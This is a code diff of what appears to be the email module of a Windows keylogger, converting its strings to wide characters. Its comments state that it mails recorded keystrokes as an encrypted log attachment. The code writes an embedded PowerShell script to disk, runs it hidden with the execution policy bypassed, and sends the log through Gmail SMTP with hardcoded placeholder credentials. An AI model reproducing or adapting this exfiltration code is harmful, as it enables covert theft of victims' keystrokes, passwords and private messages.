@@ -8,59 +8,59 @@
 #include "Timer.h"
 #include "Helper.h"
 
-#define SCRIPT_NAME "[powershell_name].ps1"
+#define SCRIPT_NAME L"[powershell_name].ps1"
 
 //sendmail.h uses powershell to send an email detailing the keystrokes recorded within the time frame
 //by attaching the encrypted .log file to the email
 namespace Mail
 {
-    #define X_EM_TO "[recipient email address]"
-    #define X_EM_FROM "[sender email address]"
-    #define X_EM_PASS "[sender email password]"
+    #define X_EM_TO L"[recipient email address]"
+    #define X_EM_FROM L"[sender email address]"
+    #define X_EM_PASS L"[sender email password]"
 
-const std::string &PowerShellScript =
-"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
-"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
-" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
-"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
-"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
-"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
-"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
-"  ForEach ($val in $Attachments)\r\n                    "
-"        {\r\n               "
-"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
-"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
-"}\r\n                catch\r\n                    {\r\n                        exit 2; "
-"\r\n                    }\r\n            }\r\n "
-"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
-"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
-"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
-"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
-"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
-"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
-"Send-EMail -attachment $Att "
-"-To \"" +
- std::string (X_EM_TO) +
- "\""
-" -Body $Body -Subject $Subj "
-"-password \"" +
- std::string (X_EM_PASS) +
-  "\""
-" -From \"" +
- std::string (X_EM_FROM) +
-"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
+const std::wstring &PowerShellScript =
+L"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
+L"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
+L" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+L"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+L"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
+L"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+L"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+L"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+L"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
+L"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
+L"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
+L"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
+L"  ForEach ($val in $Attachments)\r\n                    "
+L"        {\r\n               "
+L"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
+L"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
+L"}\r\n                catch\r\n                    {\r\n                        exit 2; "
+L"\r\n                    }\r\n            }\r\n "
+L"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
+L"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
+L"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
+L"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
+L"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
+L"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
+L"Send-EMail -attachment $Att "
+L"-To \"" +
+ std::wstring (X_EM_TO) +
+ L"\""
+L" -Body $Body -Subject $Subj "
+L"-password \"" +
+ std::wstring (X_EM_PASS) +
+  L"\""
+L" -From \"" +
+ std::wstring (X_EM_FROM) +
+L"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
 
 #undef X_EM_FROM
 #undef X_EM_TO
 #undef X_EM_PASS
 
-    //replaces the "what" in a string with the "with"
-    std::string StringReplace(std::string s, const std::string &what, const std::string &with)
+    //replaces the "what" in a wstring with the "with"
+    std::wstring StringReplace(std::wstring s, const std::wstring &what, const std::wstring &with)
     {
         if(what.empty())
         {
@@ -68,7 +68,7 @@ const std::string &PowerShellScript =
         }
         size_t sp=0;
 
-        while( (sp=s.find(what,sp) ) != std::string::npos)
+        while( (sp=s.find(what,sp) ) != std::wstring::npos)
         {
             s.replace(sp, what.length(), with), sp +=with.length();
         }
@@ -76,9 +76,9 @@ const std::string &PowerShellScript =
     }
 
     //checks if file was created ok
-    bool CheckFileExists(const std::string &f)
+    bool CheckFileExists(const std::wstring &f)
     {
-        std::ifstream file(f);
+        std::wifstream file(f);
         return (bool)file;
     }
 
@@ -86,7 +86,7 @@ const std::string &PowerShellScript =
     //created ok
     bool CreateScript()
     {
-        std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
+        std::wofstream script(IO::GetOurPath(true) + std::wstring(SCRIPT_NAME));
 
         if(!script)
         {
@@ -104,7 +104,7 @@ const std::string &PowerShellScript =
 
     Timer m_timer;
 
-    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
+    int SendMail(const std::wstring &subject, const std::wstring &body, const std::wstring &attachments)
     {
         bool ok;
 
@@ -114,8 +114,8 @@ const std::string &PowerShellScript =
         {
             return -1;
         }
-        //getting the path and the script name and placing them in a super string
-        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
+        //getting the path and the script name and placing them in a super wstring
+        std::wstring scr_path = IO::GetOurPath(true) + std::wstring(SCRIPT_NAME);
         //if file doesn't exist: create it
         if(!CheckFileExists(scr_path))
         {
@@ -129,24 +129,24 @@ const std::string &PowerShellScript =
 
         //powershell requires admin rights to work
         //however we can use this flag to bypasss that
-        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
-                            + StringReplace(subject, "\"", "\\\"") +
-                            "\" -Body \""
-                            + StringReplace(body, "\"", "\\\"") +
-                            "\" -Att \"" + attachments + "\"";
+        std::wstring param = L"-ExecutionPolicy ByPass -File \"" + scr_path + L"\" -Subj \""
+                            + StringReplace(subject, L"\"", L"\\\"") +
+                            L"\" -Body \""
+                            + StringReplace(body, L"\"", L"\\\"") +
+                            L"\" -Att \"" + attachments + L"\"";
         //this is windows api
-        SHELLEXECUTEINFO ShExecInfo = {0};
-        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+        SHELLEXECUTEINFOW ShExecInfo = {0};
+        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFOW);
         ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
         ShExecInfo.hwnd = NULL;
-        ShExecInfo.lpVerb = "open";
-        ShExecInfo.lpFile = "powershell";
+        ShExecInfo.lpVerb = L"open";
+        ShExecInfo.lpFile = L"powershell";
         ShExecInfo.lpParameters = param.c_str();
         ShExecInfo.lpDirectory = NULL;
         ShExecInfo.nShow = SW_HIDE;
         ShExecInfo.hInstApp = NULL;
 
-        ok = (bool)ShellExecuteEx(&ShExecInfo);
+        ok = (bool)ShellExecuteExW(&ShExecInfo);
         //if script wasn't executed return -3
         if(!ok)
         {
@@ -171,20 +171,19 @@ const std::string &PowerShellScript =
             {
                 TerminateProcess(ShExecInfo.hProcess, 100);
             }
-            Helper::WriteAppLog("<From SendMail> Return Code: " + Helper::toSTDString( (int)exit_code));
+            Helper::WriteAppLog(L"<From SendMail> Return Code: " + Helper::toSTDString( (int)exit_code));
         });
 
         m_timer.repeatCount(1L);
         m_timer.setInterval(10L);
         m_timer.start();
         return (int)exit_code;
-
     }
 
     //allows us to send multiple attachments
-    int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
+    int SendMail(const std::wstring &subject, const std::wstring &body, const std::vector<std::wstring> &att)
     {
-        std::string attachments = "";
+        std::wstring attachments = L"";
         if(att.size() == 1U) //1 unsigned integar
         {
             attachments = att.at(0);
@@ -193,7 +192,7 @@ const std::string &PowerShellScript =
         {
             for(const auto &v : att)
             {
-                attachments += v + "::";
+                attachments += v + L"::";
             }
             attachments = attachments.substr(0, attachments.length() - 2);
         }
